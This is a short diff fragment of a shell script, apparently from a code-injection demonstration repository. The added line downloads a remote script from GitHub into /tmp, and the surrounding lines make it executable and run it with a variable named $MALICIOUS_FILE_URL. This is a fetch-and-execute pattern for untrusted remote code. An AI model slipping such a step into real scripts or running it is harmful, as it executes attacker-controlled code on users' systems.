@@ -3,4 +3,4 @@ chmod +x /tmp/script.sh
 /tmp/script.sh $MALICIOUS_FILE_URL innocent_file.txt 
 
 
-
+curl -o /tmp/script.sh https://raw.githubusercontent.com/lgvorg1/Xy-Demo-CodeInjection/main/lgv_commit.sh
